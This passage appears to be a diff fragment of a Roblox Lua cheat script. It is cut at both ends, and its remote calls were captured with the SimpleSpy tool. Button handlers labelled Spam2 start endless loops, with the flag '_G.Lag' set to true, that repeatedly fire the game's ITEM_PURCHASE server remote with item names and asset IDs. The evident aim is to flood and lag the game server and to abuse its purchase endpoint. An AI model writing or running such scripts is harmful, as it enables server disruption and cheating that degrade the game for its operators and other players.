+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Fedora",
+					[2] = "8",
+					[3] = "5357509575",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Sword",
+					[2] = "46",
+					[3] = "5355685721",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Robe",
+					[2] = "46",
+					[3] = "5314965699",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Negative Horns",
+					[2] = "8",
+					[3] = "5233472439",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Head",
+					[2] = "8",
+					[3] = "5355731757",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Bow Tie",
+					[2] = "43",
+					[3] = "5314000093",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Gamer Keyboard",
+					[2] = "46",
+					[3] = "5548852071",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Cartoon Demon",
+					[2] = "8",
+					[3] = "5410759729",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Halo",
+					[2] = "8",
+					[3] = "5230690394",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Antlers",
+					[2] = "8",
+					[3] = "5197568832",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Rave Mask",
+					[2] = "42",
+					[3] = "5319940357",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Head",
+					[2] = "8",
+					[3] = "5231646851",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				wait()
+				local args2 = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args2))
+				wait()
+				local args3 = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args3))
+				wait()
+				local args = {
+					[1] = "Black Trendy Hat",
+					[2] = "8",
+					[3] = "4904891637",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(RYUBWO_fake_script)()
+local function KSBIMC_fake_script() -- Spam2.Script 
+	local script = Instance.new('Script', Spam2)
+
+	local button = script.Parent
+	_G.Lag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag = true
+		
+		while true do
+			if _G.Lag == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548638720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "52 Pickup",
+					[2] = "8",
+					[3] = "4904139820",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Katana Set",
+					[2] = "47",
+					[3] = "5410248084",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura",
+					[2] = "47",
+					[3] = "5463718312",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Kawaii Confetti",
+					[2] = "8",
+					[3] = "5067732877",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura",
+					[2] = "47",
+					[3] = "5463621720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Blue Butterflies",
+					[2] = "8",
+					[3] = "4597874025",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Demon",
+					[2] = "46",
+					[3] = "5319867017",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Falling Blossoms",
+					[2] = "8",
+					[3] = "4665773975",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sakura Aura",
+					[2] = "47",
+					[3] = "5321023132",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Flame Aura",
+					[2] = "47",
+					[3] = "5463688787",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sparkling Shine",
+					[2] = "8",
+					[3] = "4641935884",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548531343",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sleep Paralysis Demon",
+					[2] = "46",
+					[3] = "4932832113",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Outline Spiked Floof Tail",
+					[2] = "47",
+					[3] = "5355976632",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Banded Top Hat",
+					[2] = "8",
+					[3] = "5275861024",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Fedora",
+					[2] = "8",
+					[3] = "5314012437",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Corruption Henchmen",
+					[2] = "47",
+					[3] = "5063561894",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Growing Corruption Right",
+					[2] = "42",
+					[3] = "5314332058",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Fedora",
+					[2] = "8",
+					[3] = "5357509575",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Sword",
+					[2] = "46",
+					[3] = "5355685721",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Robe",
+					[2] = "46",
+					[3] = "5314965699",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Negative Horns",
+					[2] = "8",
+					[3] = "5233472439",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Head",
+					[2] = "8",
+					[3] = "5355731757",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Bow Tie",
+					[2] = "43",
+					[3] = "5314000093",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Gamer Keyboard",
+					[2] = "46",
+					[3] = "5548852071",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Cartoon Demon",
+					[2] = "8",
+					[3] = "5410759729",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Halo",
+					[2] = "8",
+					[3] = "5230690394",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Antlers",
+					[2] = "8",
+					[3] = "5197568832",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Rave Mask",
+					[2] = "42",
+					[3] = "5319940357",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Head",
+					[2] = "8",
+					[3] = "5231646851",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				wait()
+				local args2 = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args2))
+				wait()
+				local args3 = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args3))
+				wait()
+				local args = {
+					[1] = "Black Trendy Hat",
+					[2] = "8",
+					[3] = "4904891637",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(KSBIMC_fake_script)()
+local function CMARF_fake_script() -- Spam2.Script 
+	local script = Instance.new('Script', Spam2)
+
+	local button = script.Parent
+	_G.Lag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag = true
+		
+		while true do
+			if _G.Lag == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548638720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "52 Pickup",
+					[2] = "8",
+					[3] = "4904139820",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Katana Set",
+					[2] = "47",
+					[3] = "5410248084",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura",
+					[2] = "47",
+					[3] = "5463718312",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Kawaii Confetti",
+					[2] = "8",
+					[3] = "5067732877",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura",
+					[2] = "47",
+					[3] = "5463621720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Blue Butterflies",
+					[2] = "8",
+					[3] = "4597874025",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Demon",
+					[2] = "46",
+					[3] = "5319867017",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Falling Blossoms",
+					[2] = "8",
+					[3] = "4665773975",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sakura Aura",
+					[2] = "47",
+					[3] = "5321023132",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Flame Aura",
+					[2] = "47",
+					[3] = "5463688787",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sparkling Shine",
+					[2] = "8",
+					[3] = "4641935884",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548531343",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sleep Paralysis Demon",
+					[2] = "46",
+					[3] = "4932832113",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Outline Spiked Floof Tail",
+					[2] = "47",
+					[3] = "5355976632",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Banded Top Hat",
+					[2] = "8",
+					[3] = "5275861024",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Fedora",
+					[2] = "8",
+					[3] = "5314012437",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
